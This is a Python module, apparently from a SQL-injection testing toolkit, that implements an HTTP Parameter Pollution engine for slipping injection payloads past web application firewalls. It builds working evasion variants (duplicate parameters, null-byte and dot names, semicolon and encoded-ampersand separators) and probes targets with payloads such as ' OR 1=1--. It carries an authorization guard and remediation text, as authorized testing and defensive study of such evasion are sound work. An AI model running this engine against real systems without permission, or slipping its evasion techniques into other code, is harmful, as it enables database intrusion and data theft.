"""
HPPEngine – HTTP Parameter Pollution engine for WAF bypass.
===========================================================

HTTP Parameter Pollution (HPP) exploits ambiguous handling of duplicate query
parameters across different server / framework stacks to bypass WAF rules and
smuggle injection payloads.

Supported techniques
--------------------
* **DUPLICATE_LAST** – Apache / PHP: the *last* occurrence of a repeated
  parameter wins; the WAF may only inspect the first.
* **DUPLICATE_FIRST** – Tomcat / Java Servlet: the *first* occurrence wins;
  benign-looking second copies satisfy WAF regex while the first carries the
  payload.
* **DUPLICATE_ALL** – IIS / ASP.NET: all values are concatenated with a
  comma; splitting a payload across two copies can defeat simple pattern
  matching.
* **ARRAY_NOTATION** – ``id[]=1&id[]=2`` style (PHP / Ruby).
* **NULL_BYTE** – ``id%00`` terminates some parser string reads early.
* **DOT_NOTATION** – ``id.1=val`` exploits ASP / ISAPI dot-removal.
* **SEMICOLON_SEPARATOR** – ``?id=val1;id=val2`` exploits non-standard
  separator handling.
* **ENCODED_AMPERSAND** – ``?id=val1%26id=val2`` bypasses WAFs that do not
  decode before splitting.

Usage::

    from sql_attacker.engine.config import ScanConfig
    from sql_attacker.hpp_engine import HPPEngine

    def my_request(url: str) -> dict:
        # return a dict with at least 'body', 'status_code', 'length'
        ...

    engine = HPPEngine(ScanConfig(), request_fn=my_request, authorized=True)
    findings = engine.scan(
        url="https://example.com/items",
        parameters={"id": "1"},
        payloads=["' OR 1=1--", "1 AND SLEEP(5)"],
    )
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from sql_attacker.engine.config import ScanConfig
from sql_attacker.engine.reporting import Evidence, Finding
from sql_attacker.engine.scoring import compute_confidence
from sql_attacker.guardrails import check_authorization

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_HPP_TECHNIQUE_LABEL = "hpp"
_HPP_REMEDIATION = (
    "Validate and normalize HTTP parameters server-side before processing. "
    "Accept only a single value per parameter and reject requests that supply "
    "duplicates. Ensure WAF rules apply to the fully decoded, merged parameter "
    "value rather than the first or last occurrence."
)
_HPP_CWE = "CWE-235"  # Improper Handling of Extra Parameters
_DEFAULT_DB_TYPE = "unknown"

# Error substrings that suggest SQL injection succeeded despite HPP wrapping.
_SQL_ERROR_PATTERNS = (
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "pg_query",
    "sqlite_",
    "unclosed quotation",
    "quoted string not properly terminated",
    "syntax error",
    "warning: mysql",
    "you have an error in your sql",
    "odbc sql server driver",
    "microsoft ole db",
    "invalid query",
    "supplied argument is not a valid mysql",
    "mssql_query()",
)

# ---------------------------------------------------------------------------
# Enums & dataclasses
# ---------------------------------------------------------------------------


class HPPTechnique(Enum):
    """Enumeration of supported HTTP Parameter Pollution techniques."""

    DUPLICATE_LAST = auto()
    """Repeat parameter; server uses the *last* value (Apache/PHP behaviour)."""

    DUPLICATE_FIRST = auto()
    """Repeat parameter; server uses the *first* value (Tomcat behaviour)."""

    DUPLICATE_ALL = auto()
    """Repeat parameter; server concatenates all values (IIS/ASP.NET behaviour)."""

    ARRAY_NOTATION = auto()
    """Use ``param[]`` array-style name to create an implicit list."""

    NULL_BYTE = auto()
    """Append a URL-encoded null byte to the parameter name (``param%00``)."""

    DOT_NOTATION = auto()
    """Use ``param.1`` dot notation; some ISAPI parsers strip the suffix."""

    SEMICOLON_SEPARATOR = auto()
    """Use ``;`` instead of ``&`` as the pair separator."""

    ENCODED_AMPERSAND = auto()
    """Use ``%26`` instead of a literal ``&`` to separate duplicate pairs."""


@dataclass
class HPPVariant:
    """A single HPP-modified URL ready for probing.

    Attributes
    ----------
    technique:
        The :class:`HPPTechnique` used to construct this variant.
    url:
        The fully constructed URL including the polluted query string.
    description:
        Human-readable explanation of what this variant tests.
    """

    technique: HPPTechnique
    url: str
    description: str


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _set_query_string(base_url: str, query_string: str) -> str:
    """Return *base_url* with its query component replaced by *query_string*."""
    parsed = urlparse(base_url)
    return urlunparse(parsed._replace(query=query_string))


def _strip_query(url: str) -> str:
    """Return *url* without its query string."""
    parsed = urlparse(url)
    return urlunparse(parsed._replace(query="", fragment=""))


def _build_query(params: Dict[str, str]) -> str:
    """Encode *params* as an application/x-www-form-urlencoded query string."""
    return urlencode(params)


def _contains_sql_error(body: str) -> bool:
    """Return True if *body* contains a recognisable SQL error pattern."""
    lower = body.lower()
    return any(pat in lower for pat in _SQL_ERROR_PATTERNS)


def _response_length_delta(baseline_len: int, probe_len: int) -> float:
    """Return a [0, 1] similarity score for two response lengths.

    A value of 1.0 means both responses have the same length; lower values
    indicate meaningful divergence (possible boolean-based detection signal).
    """
    if baseline_len == 0 and probe_len == 0:
        return 1.0
    larger = max(baseline_len, probe_len)
    diff = abs(baseline_len - probe_len)
    return 1.0 - (diff / larger)


# ---------------------------------------------------------------------------
# Main engine
# ---------------------------------------------------------------------------


class HPPEngine:
    """HTTP Parameter Pollution engine for WAF bypass and injection detection.

    Parameters
    ----------
    config:
        :class:`~sql_attacker.engine.config.ScanConfig` instance.
    request_fn:
        Callable with signature ``(url: str) -> Any`` that performs an HTTP
        GET request and returns a response object.  The response object must
        expose at least the following attributes (or dict keys):

        * ``body`` / ``text`` / ``content`` – response body as a string.
        * ``status_code`` / ``status`` – integer HTTP status code.
        * ``length`` / ``content_length`` – body length in bytes (optional;
          derived from ``body`` if absent).

        Both attribute-style objects and plain dicts are supported.
    authorized:
        Must be ``True`` before any live HTTP request is sent.  If ``False``
        every probe raises :exc:`~sql_attacker.guardrails.AuthorizationError`.
    """

    def __init__(
        self,
        config: ScanConfig,
        request_fn: Callable,
        authorized: bool = False,
    ) -> None:
        self._config = config
        self._request_fn = request_fn
        self._authorized = authorized

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate_hpp_variants(
        self,
        url: str,
        parameter: str,
        payload: str,
    ) -> List[HPPVariant]:
        """Generate all HPP-modified URL variants for *parameter* / *payload*.

        The base URL's existing query parameters are preserved in every
        variant; only the target *parameter* is duplicated or mutated.

        Parameters
        ----------
        url:
            Target URL (may already contain a query string).
        parameter:
            Name of the query parameter to pollute.
        payload:
            Injection value to inject via the polluted parameter.

        Returns
        -------
        List[HPPVariant]
            One :class:`HPPVariant` per :class:`HPPTechnique`.
        """
        parsed = urlparse(url)
        existing: Dict[str, List[str]] = parse_qs(
            parsed.query, keep_blank_values=True
        )
        # Build a clean dict of existing params (single values only).
        base_params: Dict[str, str] = {
            k: v[0] for k, v in existing.items() if k != parameter
        }
        # Original value for the target parameter (benign, used as the "safe"
        # half in split-payload techniques).
        original_value: str = (
            existing[parameter][0] if parameter in existing else "1"
        )

        variants: List[HPPVariant] = []

        # ---- DUPLICATE_LAST (Apache / PHP) --------------------------------
        # Benign copy first, payload second → server keeps the last (payload).
        # WAF only validates the first (benign) copy.
        qs = _build_query({**base_params, parameter: original_value})
        qs += f"&{parameter}={_pct_encode(payload)}"
        variants.append(
            HPPVariant(
                technique=HPPTechnique.DUPLICATE_LAST,
                url=_set_query_string(url, qs),
                description=(
                    f"Apache/PHP: WAF sees first (benign) '{parameter}', "
                    f"server processes last (payload) copy."
                ),
            )
        )

        # ---- DUPLICATE_FIRST (Tomcat / Java Servlet) ----------------------
        # Payload first, benign second → server keeps the first (payload).
        qs = _build_query(base_params)
        if qs:
            qs += "&"
        qs += f"{parameter}={_pct_encode(payload)}"
        qs += f"&{parameter}={_pct_encode(original_value)}"
        variants.append(
            HPPVariant(
                technique=HPPTechnique.DUPLICATE_FIRST,
                url=_set_query_string(url, qs),
                description=(
                    f"Tomcat: server uses first '{parameter}' value (payload); "
                    f"WAF may evaluate the second (benign) copy."
                ),
            )
        )

        # ---- DUPLICATE_ALL (IIS / ASP.NET) --------------------------------
        # Split the payload across two copies so that ASP.NET concatenates them
        # with a comma.  For a simple payload we just duplicate it; the WAF
        # may only match against each fragment individually.
        # For payloads shorter than 2 characters an even split is impossible;
        # duplicate the whole payload instead so a valid (if redundant) probe
        # is still emitted.
        if len(payload) >= 2:
            mid = len(payload) // 2
            part_a, part_b = payload[:mid], payload[mid:]
        else:
            part_a, part_b = payload, payload
        qs = _build_query(base_params)
        if qs:
            qs += "&"
        qs += f"{parameter}={_pct_encode(part_a)}"
        qs += f"&{parameter}={_pct_encode(part_b)}"
        variants.append(
            HPPVariant(
                technique=HPPTechnique.DUPLICATE_ALL,
                url=_set_query_string(url, qs),
                description=(
                    f"IIS/ASP.NET: payload split across two '{parameter}' values; "
                    f"server concatenates them with ',' — WAF only sees fragments."
                ),
            )
        )

        # ---- ARRAY_NOTATION (PHP / Ruby) ----------------------------------
        # Some frameworks treat ``param[]`` as an array; the WAF pattern may
        # only match the exact name ``param``.
        array_name = f"{parameter}[]"
        qs = _build_query(base_params)
        if qs:
            qs += "&"
        qs += f"{_pct_encode(array_name)}={_pct_encode(payload)}"
        variants.append(
            HPPVariant(
                technique=HPPTechnique.ARRAY_NOTATION,
                url=_set_query_string(url, qs),
                description=(
                    f"Array notation: parameter renamed '{array_name}'; "
                    f"PHP/Ruby still maps it to '{parameter}'."
                ),
            )
        )

        # ---- NULL_BYTE ----------------------------------------------------
        # A null byte in the parameter *name* terminates C-string parsers early;
        # the suffix ``%00`` is invisible to pattern-matching WAFs.
        null_name = f"{parameter}%00"
        qs = _build_query(base_params)
        if qs:
            qs += "&"
        qs += f"{null_name}={_pct_encode(payload)}"
        variants.append(
            HPPVariant(
                technique=HPPTechnique.NULL_BYTE,
                url=_set_query_string(url, qs),
                description=(
                    f"Null-byte pollution: parameter name '{null_name}'; "
                    f"C-string parsers see '{parameter}', WAF sees the full name."
                ),
            )
        )

        # ---- DOT_NOTATION -------------------------------------------------
        # ASP / ISAPI silently strips everything after the first dot in a
        # parameter name, mapping ``id.x`` → ``id``.
        dot_name = f"{parameter}.1"
        qs = _build_query(base_params)
        if qs:
            qs += "&"
        qs += f"{dot_name}={_pct_encode(payload)}"
        variants.append(
            HPPVariant(
                technique=HPPTechnique.DOT_NOTATION,
                url=_set_query_string(url, qs),
                description=(
                    f"Dot notation: parameter renamed '{dot_name}'; "
                    f"ASP/ISAPI maps it to '{parameter}'."
                ),
            )
        )

        # ---- SEMICOLON_SEPARATOR ------------------------------------------
        # RFC 3986 does not mandate ``&`` as a separator; some frameworks also
        # accept ``;``.  WAFs that only split on ``&`` will not see the second
        # parameter value.
        qs_base = _build_query(base_params)
        semicolon_qs = (
            f"{qs_base}&" if qs_base else ""
        ) + f"{parameter}={_pct_encode(original_value)};{parameter}={_pct_encode(payload)}"
        variants.append(
            HPPVariant(
                technique=HPPTechnique.SEMICOLON_SEPARATOR,
                url=_set_query_string(url, semicolon_qs),
                description=(
                    f"Semicolon separator: '{parameter}' repeated with ';' as "
                    f"delimiter — WAFs splitting only on '&' miss the payload."
                ),
            )
        )

        # ---- ENCODED_AMPERSAND --------------------------------------------
        # ``%26`` is the percent-encoded form of ``&``.  A WAF that does not
        # fully decode the query string before splitting will treat the whole
        # thing as a single value for the first parameter.
        encoded_qs = (
            f"{_build_query(base_params)}&" if base_params else ""
        ) + (
            f"{parameter}={_pct_encode(original_value)}"
            f"%26{parameter}={_pct_encode(payload)}"
        )
        variants.append(
            HPPVariant(
                technique=HPPTechnique.ENCODED_AMPERSAND,
                url=_set_query_string(url, encoded_qs),
                description=(
                    f"Encoded ampersand: second '{parameter}' hidden behind "
                    f"'%26' — WAF never decodes it, server does."
                ),
            )
        )

        return variants

    def detect(
        self,
        url: str,
        parameter: str,
        payload: str,
        baseline_response: Optional[Any] = None,
    ) -> Optional[Finding]:
        """Probe one parameter / payload combination with every HPP variant.

        Each variant URL is requested in turn; anomalies in the response
        (SQL error strings, status-code changes, significant length deltas)
        are collected and scored with :func:`~sql_attacker.engine.scoring.compute_confidence`.

        Parameters
        ----------
        url:
            Target URL.
        parameter:
            Query parameter to pollute.
        payload:
            Injection string to deliver via HPP.
        baseline_response:
            Optional pre-fetched baseline response (same format as the return
            value of *request_fn*).  When ``None`` a fresh baseline is fetched.

        Returns
        -------
        Optional[Finding]
            A :class:`~sql_attacker.engine.reporting.Finding` when one or more
            HPP variants produce a suspicious signal, ``None`` otherwise.
        """
        check_authorization(self._authorized)

        # ------------------------------------------------------------------
        # Establish baseline
        # ------------------------------------------------------------------
        if baseline_response is None:
            logger.debug("HPPEngine: fetching baseline for %s", url)
            baseline_response = self._safe_request(url)

        baseline_body = _extract_body(baseline_response)
        baseline_status = _extract_status(baseline_response)
        baseline_len = len(baseline_body)

        # ------------------------------------------------------------------
        # Generate variants and probe
        # ------------------------------------------------------------------
        variants = self.generate_hpp_variants(url, parameter, payload)
        evidence_list: List[Evidence] = []
        feature_signals: Dict[str, float] = {}

        for variant in variants:
            logger.debug(
                "HPPEngine: probing %s [%s]", variant.technique.name, variant.url
            )
            t_start = time.monotonic()
            resp = self._safe_request(variant.url)
            elapsed_ms = (time.monotonic() - t_start) * 1000.0

            if resp is None:
                continue

            body = _extract_body(resp)
            status = _extract_status(resp)
            resp_len = len(body)

            has_sql_error = _contains_sql_error(body)
            status_changed = status != baseline_status
            length_sim = _response_length_delta(baseline_len, resp_len)
            significant_length_change = length_sim < 0.85

            if not (has_sql_error or status_changed or significant_length_change):
                continue

            # Accumulate feature signals (max across variants per signal type).
            if has_sql_error:
                feature_signals["error_pattern_match"] = 1.0
            if status_changed:
                feature_signals["status_code_change"] = max(
                    feature_signals.get("status_code_change", 0.0), 0.7
                )
            if significant_length_change:
                # Map similarity to a 0–0.6 signal strength.
                signal_strength = (1.0 - length_sim) * 0.6 / 0.15
                feature_signals["response_length_delta"] = max(
                    feature_signals.get("response_length_delta", 0.0),
                    min(signal_strength, 0.6),
                )

            excerpt = body[:512] if body else ""
            evidence_list.append(
                Evidence(
                    payload=payload,
                    request_summary=(
                        f"GET {variant.url} — technique={variant.technique.name}"
                    ),
                    response_length=resp_len,
                    response_body_excerpt=excerpt,
                    timing_samples_ms=[round(elapsed_ms, 2)],
                    technique=_HPP_TECHNIQUE_LABEL,
                )
            )
            logger.debug(
                "HPPEngine: signal detected via %s (error=%s, status_change=%s, "
                "length_sim=%.2f)",
                variant.technique.name,
                has_sql_error,
                status_changed,
                length_sim,
            )

        if not evidence_list:
            return None

        scoring_result = compute_confidence(feature_signals)

        finding = Finding(
            parameter=parameter,
            technique=_HPP_TECHNIQUE_LABEL,
            db_type=_DEFAULT_DB_TYPE,
            confidence=scoring_result.score,
            verdict=scoring_result.verdict,
            evidence=evidence_list,
            remediation=_HPP_REMEDIATION,
            url=_strip_query(url),
            method="GET",
            parameter_location="query_param",
            cwe=_HPP_CWE,
            score_rationale=scoring_result.rationale,
        )
        return finding

    def scan(
        self,
        url: str,
        parameters: Dict[str, str],
        payloads: List[str],
    ) -> List[Finding]:
        """Scan every combination of *parameters* × *payloads*.

        Authorization is checked once before the first request; subsequent
        requests reuse the same authorisation state so the check is not
        repeated on every variant (avoiding unnecessary overhead while still
        enforcing the guard).

        Parameters
        ----------
        url:
            Target URL (may already contain a query string; existing
            parameters are preserved alongside the tested ones).
        parameters:
            Dict mapping parameter names to their benign baseline values.
            Each parameter is tested independently.
        payloads:
            List of injection payloads to attempt via HPP variants.

        Returns
        -------
        List[Finding]
            All findings discovered across every parameter / payload pair.
            Empty list when nothing suspicious is detected.
        """
        check_authorization(self._authorized)

        findings: List[Finding] = []

        for param_name in parameters:
            # One baseline per parameter (shared across all payloads for it).
            baseline_url = _set_query_string(
                url, _build_query({**parameters})
            )
            logger.debug("HPPEngine: baseline request for param '%s'", param_name)
            baseline = self._safe_request(baseline_url)

            for payload in payloads:
                finding = self.detect(
                    url=baseline_url,
                    parameter=param_name,
                    payload=payload,
                    baseline_response=baseline,
                )
                if finding is not None:
                    findings.append(finding)
                    logger.info(
                        "HPPEngine: finding [%s] param='%s' confidence=%.3f",
                        finding.verdict,
                        param_name,
                        finding.confidence,
                    )

        return findings

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _safe_request(self, url: str) -> Optional[Any]:
        """Call *request_fn* and swallow non-fatal exceptions.

        Returns ``None`` on error so callers can skip failed probes gracefully.
        """
        try:
            return self._request_fn(url)
        except Exception as exc:  # noqa: BLE001
            logger.warning("HPPEngine: request failed for %s — %s", url, exc)
            return None


# ---------------------------------------------------------------------------
# Module-level helpers (not part of the class interface)
# ---------------------------------------------------------------------------


def _pct_encode(value: str) -> str:
    """Percent-encode *value* using :mod:`urllib.parse` safe characters.

    We keep ``/``, ``:``, ``@``, ``!``, ``$``, ``*``, ``(``, ``)`` unencoded
    (common in SQL payloads) but encode ``&``, ``=``, ``+``, ``#``, ``%``,
    and space so the payload does not accidentally break the query string
    structure.
    """
    # Use urllib.parse.quote which handles proper encoding.
    from urllib.parse import quote

    return quote(value, safe="/:@!$*()'")


def _extract_body(response: Any) -> str:
    """Extract the response body as a string from various response shapes."""
    if response is None:
        return ""
    # Attribute-style (requests.Response, httpx.Response, custom objects)
    for attr in ("text", "body", "content", "data"):
        val = getattr(response, attr, None)
        if val is not None:
            return str(val)
    # Dict-style
    if isinstance(response, dict):
        for key in ("text", "body", "content", "data"):
            if key in response:
                return str(response[key])
    return ""


def _extract_status(response: Any) -> int:
    """Extract the HTTP status code from various response shapes."""
    if response is None:
        return 0
    for attr in ("status_code", "status", "code"):
        val = getattr(response, attr, None)
        if val is not None:
            try:
                return int(val)
            except (TypeError, ValueError):
                pass
    if isinstance(response, dict):
        for key in ("status_code", "status", "code"):
            if key in response:
                try:
                    return int(response[key])
                except (TypeError, ValueError):
                    pass
    return 0
